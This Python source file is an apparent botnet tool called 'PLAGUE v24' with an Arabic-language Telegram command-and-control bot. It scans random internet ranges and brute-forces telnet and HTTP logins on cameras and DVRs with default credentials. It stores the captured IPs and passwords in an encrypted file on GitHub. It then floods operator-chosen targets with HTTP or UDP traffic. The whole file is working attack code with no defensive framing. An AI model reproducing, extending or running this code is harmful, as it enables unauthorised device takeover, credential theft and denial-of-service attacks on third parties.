#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PLAGUE v24.0 – PERSISTENT + CONTINUOUS
- Auto-load devices from GitHub on startup (no data loss on restart)
- Save to GitHub immediately after each capture
- Continuous attack loop with periodic status updates
- Clean Telegram UI with direct commands
"""

import asyncio
import aiohttp
import socket
import ipaddress
import random
import time
import json
import os
import sys
import base64
import logging
import hashlib
import struct
from typing import List, Dict, Optional, Tuple
from datetime import datetime
from cryptography.fernet import Fernet
from pydantic_settings import BaseSettings, SettingsConfigDict

# ===================================================================
# CONFIG
# ===================================================================
class Settings(BaseSettings):
    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")
    bot_token: str
    admin_chat_id: str
    gh_pat: str
    encryption_key: str
    github_repo: str = ""
    scan_timeout: float = 2.0
    max_concurrent_scan: int = 280
    max_concurrent_attack: int = 240
    telegram_rate_limit_sec: float = 30.0
    max_scan_ips_per_subnet: int = 128

settings = Settings()

logger = logging.getLogger("PLAGUE")
logger.setLevel(logging.INFO)
h = logging.StreamHandler(sys.stdout)
h.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
logger.addHandler(h)

# ===================================================================
# ENCRYPTION
# ===================================================================
hashed = hashlib.sha256(settings.encryption_key.encode()).digest()
cipher = Fernet(base64.urlsafe_b64encode(hashed))

BACKUP_FILE = "swarm.enc"
BACKUP_URL = f"https://api.github.com/repos/{settings.github_repo}/contents/{BACKUP_FILE}"

# ===================================================================
# DATABASE (in-memory + GitHub sync)
# ===================================================================
class Database:
    def __init__(self):
        self.devices: List[Dict] = []
        self.lock = asyncio.Lock()
        self.dirty = False
        self.last_save_time = 0

    async def load_from_github(self):
        """Load existing devices from encrypted file on GitHub"""
        try:
            headers = {"Authorization": f"token {settings.gh_pat}", "Accept": "application/vnd.github.v3+json"}
            async with aiohttp.ClientSession() as s:
                async with s.get(BACKUP_URL, headers=headers) as r:
                    if r.status == 200:
                        data = await r.json()
                        content = base64.b64decode(data["content"])
                        decrypted = cipher.decrypt(content)
                        self.devices = json.loads(decrypted)
                        logger.info(f"✅ Loaded {len(self.devices)} devices from GitHub.")
                        return
                    elif r.status == 404:
                        logger.info("No existing backup. Starting fresh.")
                        return
                    else:
                        logger.warning(f"Unexpected GitHub response: {r.status}")
        except Exception as e:
            logger.warning(f"Load failed: {e}")
        self.devices = []

    async def save_to_github(self, force=False):
        """Encrypt + upload to GitHub. Throttled to 1 per 20s unless forced."""
        now = time.time()
        if not force and (now - self.last_save_time < 20):
            self.dirty = True
            return
        if not self.devices:
            return
        try:
            payload = json.dumps(self.devices).encode()
            encrypted = cipher.encrypt(payload)
            content_b64 = base64.b64encode(encrypted).decode()
            headers = {"Authorization": f"token {settings.gh_pat}", "Accept": "application/vnd.github.v3+json"}
            async with aiohttp.ClientSession() as s:
                body = {"message": f"update {datetime.now().isoformat()}", "content": content_b64}
                async with s.get(BACKUP_URL, headers=headers) as r:
                    if r.status == 200:
                        body["sha"] = (await r.json()).get("sha")
                async with s.put(BACKUP_URL, headers=headers, json=body) as r:
                    if r.status in (200, 201):
                        logger.info(f"💾 Saved {len(self.devices)} devices to GitHub.")
                        self.last_save_time = now
                        self.dirty = False
                    else:
                        logger.warning(f"Save failed: {r.status}")
        except Exception as e:
            logger.error(f"Save error: {e}")

    async def save_device(self, ip, port, service, creds, verification="unknown"):
        async with self.lock:
            if any(d["ip"] == ip and d["port"] == port for d in self.devices):
                return
            self.devices.append({
                "ip": ip, "port": port, "service": service, "creds": creds,
                "verification": verification, "timestamp": datetime.now().isoformat()
            })
            logger.info(f"🎯 CAPTURED: {ip}:{port} [{service}] {creds} via {verification} (total: {len(self.devices)})")
            self.dirty = True
        await self.save_to_github(force=True)

    async def get_devices(self, limit=None):
        return self.devices[-limit:] if limit else self.devices[:]

    async def background_saver(self):
        """Periodic saver in case save_device throttling leaves data unsaved"""
        while True:
            await asyncio.sleep(60)
            if self.dirty:
                await self.save_to_github(force=True)

db = Database()

# ===================================================================
# PUBLIC IP
# ===================================================================
async def get_public_ip(session):
    try:
        async with session.get("https://api.ipify.org?format=text", timeout=5) as r:
            return (await r.text()).strip()
    except:
        return "0.0.0.0"

# ===================================================================
# VERIFICATION ENGINE
# ===================================================================
class Verifier:
    def __init__(self, session):
        self.session = session

    async def verify_onvif(self, ip):
        try:
            probe = """<?xml version="1.0" encoding="UTF-8"?><e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope" xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery" xmlns:dn="http://www.onvif.org/ver10/network/wsdl"><e:Header><w:MessageID>uuid:12345</w:MessageID><w:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To><w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action></e:Header><e:Body><d:Probe><d:Types>dn:NetworkVideoTransmitter</d:Types></d:Probe></e:Body></e:Envelope>"""
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.settimeout(3.0)
            sock.sendto(probe.encode(), (ip, 3702))
            try:
                data, _ = sock.recvfrom(65535)
                if b"NetworkVideoTransmitter" in data or b"onvif" in data.lower():
                    return True
            except socket.timeout:
                pass
            finally:
                sock.close()
        except:
            pass
        return False

    async def verify_rtsp(self, ip, port=554):
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=3.0)
            for path in ["/", "/live", "/stream1", "/h264"]:
                req = f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
                writer.write(req.encode()); await writer.drain()
                data = await asyncio.wait_for(reader.read(1024), timeout=2.0)
                text = data.decode(errors="ignore")
                if "RTSP/1.0 200" in text and ("m=video" in text or "application/sdp" in text):
                    writer.close(); await writer.wait_closed()
                    return True
            writer.close(); await writer.wait_closed()
        except:
            pass
        return False

    async def verify_snapshot(self, ip, port, user="", pwd=""):
        headers = {"User-Agent": "Mozilla/5.0"}
        if user and pwd:
            token = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            headers["Authorization"] = f"Basic {token}"
        for path in ["/snapshot.cgi", "/ISAPI/Streaming/channels/101/picture", "/cgi-bin/snapshot.cgi", "/jpg/image.jpg"]:
            try:
                url = f"http://{ip}:{port}{path}"
                async with self.session.get(url, headers=headers, ssl=False, timeout=3.0) as r:
                    if r.status == 200:
                        data = await r.content.read(16)
                        if len(data) >= 4:
                            if data[0] == 0xFF and data[1] == 0xD8: return True  # JPEG
                            if data[0] == 0x89 and data[1] == 0x50: return True  # PNG
            except:
                pass
        return False

    async def is_real(self, ip, port, user="", pwd=""):
        if await self.verify_onvif(ip): return True, "ONVIF"
        if await self.verify_rtsp(ip, 554): return True, "RTSP"
        if user and pwd and await self.verify_snapshot(ip, port, user, pwd): return True, "SNAPSHOT"
        return False, "none"

# ===================================================================
# SCANNER
# ===================================================================
class Scanner:
    def __init__(self):
        self.sem = asyncio.Semaphore(settings.max_concurrent_scan)
        self.session = None
        self.running = True
        self.verifier = None

    async def init(self):
        conn = aiohttp.TCPConnector(limit=40, limit_per_host=5, ttl_dns_cache=60)
        self.session = aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=settings.scan_timeout))
        ip = await get_public_ip(self.session)
        self.verifier = Verifier(self.session)
        logger.info(f"IP: {ip}")

    async def close(self):
        if self.session: await self.session.close()

    async def tcp_scan(self, ip, port):
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2)
            w.close(); await w.wait_closed()
            return True
        except:
            return False

    async def telnet_brute(self, ip):
        creds = [("admin","admin"),("root","root"),("admin",""),("admin","password"),("root","admin")]
        for u,p in creds:
            try:
                r,w = await asyncio.wait_for(asyncio.open_connection(ip,23), timeout=3)
                try: await asyncio.wait_for(r.read(128), timeout=0.5)
                except: pass
                w.write(f"{u}\n".encode()); await w.drain(); await asyncio.sleep(0.2)
                d = await asyncio.wait_for(r.read(128), timeout=0.5)
                if b"assword" in d:
                    w.write(f"{p}\n".encode()); await w.drain(); await asyncio.sleep(0.3)
                    d = await asyncio.wait_for(r.read(256), timeout=1)
                    if any(b in d for b in [b"#",b"$",b">"]):
                        real, vtype = await self.verifier.is_real(ip, 80, u, p)
                        if real:
                            await db.save_device(ip, 23, "TELNET", f"{u}:{p}", vtype)
                w.close(); await w.wait_closed()
                break
            except: continue

    async def http_brute(self, ip, port):
        creds = [("admin","admin"),("admin","password"),("root","root"),("admin","12345"),("admin","")]
        for u,p in creds:
            try:
                token = base64.b64encode(f"{u}:{p}".encode()).decode()
                headers = {"Authorization": f"Basic {token}", "User-Agent": "Mozilla/5.0"}
                async with self.session.get(f"http://{ip}:{port}/", headers=headers, ssl=False, timeout=1.5) as resp:
                    if resp.status in (200,302,401):
                        real, vtype = await self.verifier.is_real(ip, port, u, p)
                        if real:
                            await db.save_device(ip, port, "HTTP", f"{u}:{p}", vtype)
                            return
            except: continue

    async def global_scan(self):
        logger.info("Scanner started (real verification mode).")
        while self.running:
            a, b, c = random.randint(1,223), random.randint(0,255), random.randint(0,255)
            net = f"{a}.{b}.{c}.0/24"
            ports = [23, 80, 443, 8080, 8000, 554, 37777, 34567]
            tasks = []
            try:
                for ip in list(ipaddress.ip_network(net).hosts())[:settings.max_scan_ips_per_subnet]:
                    for port in ports:
                        tasks.append(self._probe(str(ip), port))
            except: continue
            for i in range(0, len(tasks), 40):
                if not self.running: break
                await asyncio.gather(*tasks[i:i+40])
                await asyncio.sleep(0.3)
            await asyncio.sleep(0.5)

    async def _probe(self, ip, port):
        async with self.sem:
            if await self.tcp_scan(ip, port):
                if port == 23: await self.telnet_brute(ip)
                elif port in (80,443,8080,8000,37777,34567): await self.http_brute(ip, port)
                elif port == 554:
                    if await self.verifier.verify_rtsp(ip, 554):
                        await db.save_device(ip, 554, "RTSP", "", "RTSP")

# ===================================================================
# ATTACK ENGINE (CONTINUOUS)
# ===================================================================
class Attacker:
    def __init__(self, target, mode, devices, notify):
        self.target = target
        self.mode = mode
        self.devices = devices
        self.active = asyncio.Event()
        self.active.set()
        self.sem = asyncio.Semaphore(settings.max_concurrent_attack)
        self.notify = notify
        self.request_count = 0

    async def run(self):
        if self.mode == "http":
            await self._http()
        elif self.mode == "udp":
            await self._udp()

    async def _http(self):
        conn = aiohttp.TCPConnector(limit=15, force_close=True)
        async with aiohttp.ClientSession(connector=conn) as s:
            cycle = 0
            while self.active.is_set():
                cycle += 1
                tasks = [self._strike(s) for _ in self.devices]
                for i in range(0, len(tasks), 15):
                    if not self.active.is_set(): break
                    await asyncio.gather(*tasks[i:i+15])
                    await asyncio.sleep(0.05)
                # Report every 5 cycles
                if cycle % 5 == 0:
                    await self.notify(f"🔁 Cycle {cycle} | Sent: {self.request_count} requests | Devices: {len(self.devices)}")
                await asyncio.sleep(0.1)

    async def _strike(self, session):
        if not self.active.is_set(): return
        async with self.sem:
            try:
                kw = {"timeout": aiohttp.ClientTimeout(total=1.5), "ssl": False}
                async with session.get(self.target, **kw) as r:
                    await r.content.read(256)
                self.request_count += 1
                async with session.post(self.target, data={"x": "A"*500}, **kw) as r:
                    await r.content.read(256)
                self.request_count += 1
            except: pass

    async def _udp(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        loop = asyncio.get_event_loop()
        ip, port = self.target.split(":"); port = int(port)
        cycle = 0
        while self.active.is_set():
            cycle += 1
            for _ in self.devices:
                try:
                    await loop.sock_sendto(sock, b"Z"*1200, (ip, port))
                    self.request_count += 1
                except: pass
            if cycle % 50 == 0:
                await self.notify(f"🔁 Cycle {cycle} | Sent: {self.request_count} packets | Devices: {len(self.devices)}")
            await asyncio.sleep(0.01)
        sock.close()

    def stop(self):
        self.active.clear()

# ===================================================================
# TELEGRAM C2 (Clean UI)
# ===================================================================
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

class C2:
    def __init__(self, scanner):
        self.scanner = scanner
        self.app = None
        self.attacker = None

    def _main_menu(self):
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
             InlineKeyboardButton("📋 قائمة الأجهزة", callback_data="list")],
            [InlineKeyboardButton("💀 هجوم HTTP", callback_data="atk_http"),
             InlineKeyboardButton("🔥 هجوم UDP", callback_data="atk_udp")],
            [InlineKeyboardButton("📦 نسخة احتياطية", callback_data="backup"),
             InlineKeyboardButton("🛑 إيقاف الهجوم", callback_data="stop_attack")],
            [InlineKeyboardButton("⏹ إيقاف كل شيء", callback_data="halt")],
        ])

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_user.id) != settings.admin_chat_id: return
        devs = await db.get_devices()
        await update.message.reply_text(
            f"🔥 *PLAGUE v24 – C2*\n\n"
            f"📊 الأجهزة: *{len(devs)}*\n"
            f"🔄 الماسح: *{'يعمل' if self.scanner.running else 'متوقف'}*\n"
            f"⚔️ الهجوم: *{'نشط' if self.attacker and self.attacker.active.is_set() else 'متوقف'}*\n\n"
            f"اختر العملية:",
            parse_mode="Markdown",
            reply_markup=self._main_menu()
        )

    async def button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        q = update.callback_query; await q.answer()
        if str(update.effective_user.id) != settings.admin_chat_id: return
        d = q.data

        if d == "stats":
            devs = await db.get_devices()
            types = {}
            for dev in devs:
                types[dev.get("verification", "?")] = types.get(dev.get("verification", "?"), 0) + 1
            type_str = "\n".join(f"  • {k}: {v}" for k, v in types.items()) or "  • لا توجد"
            await q.edit_message_text(
                f"📊 *الإحصائيات*\n\n"
                f"الأجهزة المؤكدة: *{len(devs)}*\n"
                f"أنواع التحقق:\n{type_str}\n"
                f"الماسح: *{'✅ يعمل' if self.scanner.running else '⏹ متوقف'}*",
                parse_mode="Markdown"
            )
        elif d == "list":
            devs = await db.get_devices(limit=15)
            if not devs:
                await q.edit_message_text("📭 القائمة فارغة.")
                return
            txt = "📋 *آخر 15 جهاز مؤكد:*\n\n"
            for dev in reversed(devs):
                txt += f"• `{dev['ip']}:{dev['port']}` | {dev['creds']} | {dev['verification']}\n"
            await q.edit_message_text(txt, parse_mode="Markdown")
        elif d in ("atk_http", "atk_udp"):
            context.user_data["mode"] = "http" if d == "atk_http" else "udp"
            await q.edit_message_text(f"✍️ أرسل الهدف ({'رابط http/https' if d == 'atk_http' else 'IP:PORT'}):")
        elif d == "backup":
            await q.edit_message_text("📦 جارٍ رفع النسخة الاحتياطية...")
            await db.save_to_github(force=True)
            await q.edit_message_text(f"✅ تم رفع {len(await db.get_devices())} جهاز إلى GitHub.")
        elif d == "stop_attack":
            if self.attacker: self.attacker.stop()
            await q.edit_message_text("🛑 تم إيقاف الهجوم.")
        elif d == "halt":
            if self.attacker: self.attacker.stop()
            self.scanner.running = False
            await db.save_to_github(force=True)
            await q.edit_message_text("⏹ تم إيقاف كل شيء وحفظ البيانات.")
            await context.application.stop_running()

    async def handle_target(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_user.id) != settings.admin_chat_id: return
        mode = context.user_data.pop("mode", None)
        if not mode: return
        target = update.message.text.strip()
        devs = await db.get_devices()
        if not devs:
            await update.message.reply_text("❌ لا توجد أجهزة. انتظر الصيد.")
            return
        if self.attacker: self.attacker.stop()
        
        async def notify(text):
            try: await update.message.reply_text(text)
            except: pass
        
        self.attacker = Attacker(target, mode, devs, notify)
        asyncio.create_task(self.attacker.run())
        await update.message.reply_text(
            f"⚔️ *بدأ الهجوم*\n"
            f"الهدف: `{target}`\n"
            f"الأجهزة: {len(devs)}\n"
            f"النوع: {mode.upper()}\n\n"
            f"سيستمر حتى الإيقاف. سيصلك تقرير كل 5 دورات.",
            parse_mode="Markdown"
        )

    async def cmd_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_user.id) != settings.admin_chat_id: return
        devs = await db.get_devices()
        attacking = self.attacker and self.attacker.active.is_set()
        await update.message.reply_text(
            f"📊 *الحالة*\n"
            f"الأجهزة: {len(devs)}\n"
            f"الماسح: {'✅' if self.scanner.running else '⏹'}\n"
            f"الهجوم: {'⚔️ نشط' if attacking else '⏹ متوقف'}\n"
            f"طلبات مرسلة: {self.attacker.request_count if self.attacker else 0}",
            parse_mode="Markdown"
        )

    async def cmd_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_user.id) != settings.admin_chat_id: return
        if not context.args:
            await update.message.reply_text("الاستخدام: /attack <url>  أو  /attack <ip:port> udp")
            return
        target = context.args[0]
        mode = "udp" if len(context.args) > 1 and context.args[1].lower() == "udp" else "http"
        devs = await db.get_devices()
        if not devs:
            await update.message.reply_text("❌ لا توجد أجهزة.")
            return
        if self.attacker: self.attacker.stop()
        async def notify(text):
            try: await update.message.reply_text(text)
            except: pass
        self.attacker = Attacker(target, mode, devs, notify)
        asyncio.create_task(self.attacker.run())
        await update.message.reply_text(f"⚔️ هجوم {mode.upper()} على {target} بـ {len(devs)} جهاز.")

    async def cmd_stop(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if str(update.effective_user.id) != settings.admin_chat_id: return
        if self.attacker: self.attacker.stop()
        await update.message.reply_text("🛑 تم إيقاف الهجوم.")

    async def run(self):
        self.app = Application.builder().token(settings.bot_token).build()
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CommandHandler("status", self.cmd_status))
        self.app.add_handler(CommandHandler("attack", self.cmd_attack))
        self.app.add_handler(CommandHandler("stop", self.cmd_stop))
        self.app.add_handler(CallbackQueryHandler(self.button))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_target))
        await self.app.initialize()
        await self.app.start()
        await self.app.updater.start_polling()
        logger.info("🤖 Bot online.")
        try:
            while True: await asyncio.sleep(3600)
        except asyncio.CancelledError:
            await self.app.stop()

# ===================================================================
# MAIN
# ===================================================================
async def main():
    # CRITICAL: Load existing devices first
    await db.load_from_github()
    logger.info(f"🚀 Starting with {len(db.devices)} existing devices.")
    
    scanner = Scanner()
    await scanner.init()
    
    # Background saver
    saver_task = asyncio.create_task(db.background_saver())
    scan_task = asyncio.create_task(scanner.global_scan())
    
    c2 = C2(scanner)
    try:
        await c2.run()
    finally:
        scanner.running = False
        scan_task.cancel()
        saver_task.cancel()
        await db.save_to_github(force=True)
        await scanner.close()

if __name__ == "__main__":
    asyncio.run(main())
